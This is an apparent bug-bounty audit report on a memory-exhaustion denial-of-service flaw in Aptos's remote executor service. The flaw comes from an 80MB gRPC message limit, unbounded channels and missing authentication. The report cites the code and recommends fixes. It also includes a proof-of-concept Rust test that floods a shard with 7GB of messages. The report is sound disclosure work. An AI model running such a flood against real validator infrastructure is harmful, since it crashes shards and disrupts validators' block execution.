# Audit Report

## Title
Memory Exhaustion DoS via Unbounded Message Queuing in Remote Executor Service

## Summary
The remote executor service used for sharded block execution lacks proper resource limits, combining an excessively generous 80MB message size limit with unbounded channel buffering and no authentication. This enables memory exhaustion attacks that can crash validator executor shards, disrupting block execution and validator liveness.

## Finding Description

The sharded block executor uses a remote execution architecture where executor shards communicate via gRPC over the `NetworkController` from the `aptos-secure-net` crate. The vulnerability stems from three compounding design issues:

**1. Excessively Large Message Size Limit (80MB)**

The gRPC server sets a maximum message decoding size of 80MB: [1](#0-0) 

This limit is applied when starting the server: [2](#0-1) 

However, this 80MB limit is excessively generous compared to actual usage. At the consensus layer, blocks are limited to 6MB: [3](#0-2) 

Since blocks are partitioned across shards, each shard should receive only a fraction of the 6MB block (e.g., 1-2MB per shard), making the 80MB limit approximately 40-80x larger than necessary for legitimate operations.

**2. Unbounded Channel Buffering**

When messages arrive at the gRPC endpoint, they are immediately queued into unbounded channels: [4](#0-3) 

The channels are created as unbounded: [5](#0-4) 

Messages accumulate in these channels until the executor service processes them. The executor processes messages synchronously in a loop: [6](#0-5) 

If messages arrive faster than they can be processed, they queue indefinitely in the unbounded channel, consuming memory without limit or backpressure.

**3. No Authentication or Authorization**

The gRPC service accepts all incoming messages without authentication: [7](#0-6) 

**Attack Scenario:**

An attacker with network access to executor shard addresses (either through network misconfiguration, insider threat, or compromised node) can:

1. Establish multiple gRPC connections to a shard's socket address
2. Send numerous large messages (e.g., 100 messages Ã— 70MB each = 7GB)
3. Messages queue in the unbounded channel faster than execution can process them
4. Memory exhaustion occurs, crashing the executor shard
5. The validator cannot execute blocks, causing liveness failure

The executor service is configured via command-line arguments: [8](#0-7) 

## Impact Explanation

This is a **High Severity** vulnerability per the Aptos bug bounty program criteria:

- **Validator node slowdowns/crashes**: Memory exhaustion will slow down or crash the executor shard process
- **Significant protocol violations**: Prevents the validator from executing blocks, violating liveness guarantees
- **No validator insider access required**: Exploitable by anyone who can reach the shard's network address

The attack does not directly cause loss of funds or consensus safety violations (thus not Critical), but it does disrupt validator operations, which qualifies as High severity ("Validator node slowdowns").

## Likelihood Explanation

**Likelihood: Medium to High** depending on deployment configuration.

**Factors increasing likelihood:**
- No authentication required - any network peer can send messages
- Unbounded channels provide no backpressure mechanism
- 80MB limit is far too generous for normal operations
- Attack is simple to execute (send multiple large messages)

**Factors decreasing likelihood:**
- Requires network access to executor shard addresses
- Shards are intended for internal trusted networks
- Production deployments likely use firewall rules

However, even in properly configured internal networks, insider threats or compromised nodes within the validator infrastructure could exploit this. The lack of defense-in-depth makes this vulnerability concerning.

## Recommendation

Implement multiple defensive layers:

**1. Reduce Message Size Limit**
```rust
// In secure/net/src/grpc_network_service/mod.rs
// Reduce from 80MB to a more reasonable limit based on actual usage
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 10; // 10MB (conservative estimate)
```

**2. Use Bounded Channels**
```rust
// In secure/net/src/network_controller/mod.rs
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Change from unbounded to bounded with reasonable limit
    let (inbound_sender, inbound_receiver) = crossbeam_channel::bounded(100);
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

**3. Add Authentication**

Implement mutual TLS or token-based authentication to verify that messages come from authorized shards:

```rust
// Add authentication check in GRPCNetworkMessageServiceServerWrapper
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    // Verify authentication token or TLS certificate
    let metadata = request.metadata();
    if !self.authenticate(metadata) {
        return Err(Status::unauthenticated("Invalid credentials"));
    }
    // ... existing processing
}
```

**4. Add Rate Limiting**

Implement per-source rate limiting to prevent rapid message floods:

```rust
// Track message rates per source and reject excessive rates
if self.rate_limiter.check_rate_limit(remote_addr) {
    return Err(Status::resource_exhausted("Rate limit exceeded"));
}
```

## Proof of Concept

```rust
#[test]
fn test_memory_exhaustion_via_large_messages() {
    use crate::{
        remote_executor_service::ExecutorService,
        thread_executor_service::ThreadExecutorService,
    };
    use aptos_config::utils;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use std::thread;
    use std::time::Duration;
    
    // Setup executor shard
    let shard_port = utils::get_available_port();
    let shard_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), shard_port);
    let coordinator_port = utils::get_available_port();
    let coordinator_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), coordinator_port);
    
    let _executor_service = ThreadExecutorService::new(
        0,  // shard_id
        1,  // num_shards
        2,  // num_threads
        coordinator_addr,
        vec![shard_addr],
    );
    
    thread::sleep(Duration::from_millis(100));
    
    // Attacker sends multiple large messages
    let attack_thread = thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let mut client = GRPCNetworkMessageServiceClientWrapper::new(
                &rt,
                shard_addr,
            );
            
            // Send 100 messages of 70MB each (7GB total)
            for i in 0..100 {
                let large_message = vec![0u8; 70 * 1024 * 1024]; // 70MB
                client.send_message(
                    coordinator_addr,
                    Message::new(large_message),
                    &MessageType::new("execute_command_0".to_string()),
                ).await;
                
                println!("Sent attack message {}", i);
            }
        });
    });
    
    // Monitor memory usage - expect to see unbounded growth
    // until the process crashes or system OOM killer intervenes
    attack_thread.join().unwrap();
}
```

## Notes

While the remote executor service appears designed for trusted internal networks, the complete absence of authentication, combined with unbounded resource consumption, violates defense-in-depth principles. Even in properly secured environments, insider threats or lateral movement from compromised nodes make this vulnerability exploitable. The 80MB message size limit being 13x larger than the consensus block limit of 6MB indicates insufficient consideration of actual operational requirements versus potential abuse.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-79)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
```

**File:** secure/net/src/grpc_network_service/mod.rs (L92-115)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** config/src/config/consensus_config.rs (L231-231)
```rust
            max_receiving_block_bytes: 6 * 1024 * 1024, // 6MB
```

**File:** secure/net/src/network_controller/mod.rs (L128-136)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L222-259)
```rust
        loop {
            let command = self.coordinator_client.receive_execute_command();
            match command {
                ExecutorShardCommand::ExecuteSubBlocks(
                    state_view,
                    transactions,
                    concurrency_level_per_shard,
                    onchain_config,
                ) => {
                    num_txns += transactions.num_txns();
                    trace!(
                        "Shard {} received ExecuteBlock command of block size {} ",
                        self.shard_id,
                        num_txns
                    );
                    let exe_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "execute_block"]);
                    let ret = self.execute_block(
                        transactions,
                        state_view.as_ref(),
                        BlockExecutorConfig {
                            local: BlockExecutorLocalConfig::default_with_concurrency_level(
                                concurrency_level_per_shard,
                            ),
                            onchain: onchain_config,
                        },
                    );
                    drop(state_view);
                    drop(exe_timer);

                    let _result_tx_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "result_tx"]);
                    self.coordinator_client.send_execution_result(ret);
                },
                ExecutorShardCommand::Stop => {
                    break;
                },
            }
```

**File:** execution/executor-service/src/main.rs (L20-24)
```rust
    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
```
